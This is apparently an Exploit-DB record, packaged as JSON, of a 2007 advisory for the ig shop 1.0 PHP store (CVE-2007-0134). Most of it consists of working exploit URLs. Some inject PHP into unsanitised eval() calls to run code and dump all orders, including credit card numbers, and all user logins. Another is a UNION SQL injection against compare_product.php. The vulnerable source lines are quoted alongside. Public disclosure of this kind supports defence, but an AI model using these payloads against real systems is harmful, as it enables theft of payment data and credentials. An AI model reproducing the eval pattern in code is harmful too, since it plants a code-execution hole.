{
  "id": "3083",
  "title": "ig shop 1.0 - Code Execution / SQL Injection",
  "cve": "CVE-2007-0134",
  "vuln_type": "sqli",
  "code": "\"If eval is the answer,  then you are asking the wrong question.\"\r\n--Unknowen\r\n\r\nig-shop suffers from two eval's that can be controlled by an attacker:\r\nhttp://127.0.0.1/ig_shop/cart.php?action=;phpinfo();//\r\n./cart.php line 692:\r\neval (\"cart_$action();\");\r\n\r\nhttp://127.0.0.1/ig_shop/page.php?action=;phpinfo();//\r\n./page.php line 336:\r\neval (\"page_$action();\");\r\n\r\nDumps all credit card numbers:\r\nhttp://127.0.0.1/ig_shop/cart.php?action=;$q=mysql_query(stripslashes($l));while($a=mysql_fetch_array($q)){print_r($a);}//&l=select%20*%20from%20orders\r\nSome of these variables can be decoded using the unserlize()  funciton.\r\n\r\nDumps all logins:\r\nhttp://127.0.0.1/ig_shop/cart.php?action=;$q=mysql_query(stripslashes($l));while($a=mysql_fetch_array($q)){print_r($a);}//&l=select%20*%20from%20users\r\n\r\n\r\nsql injection works regardless of magic_quotes_gpc.\r\nhttp://127.0.0.1/ig_shop/compare_product.php?id=1%20union%20select%201\r\n./compare_product.php line 11:\r\n$qry_txt=\"select type_id from catalog_product where product_id=\".$HTTP_GET_VARS[id];\r\nShould have used quote marks. \r\n\r\nvendor's page:http://www.igeneric.co.uk/\r\n\r\nBy Michael Brooks. \r\n\r\n# milw0rm.com [2007-01-05]",
  "url": "https://www.exploit-db.com/exploits/3083"
}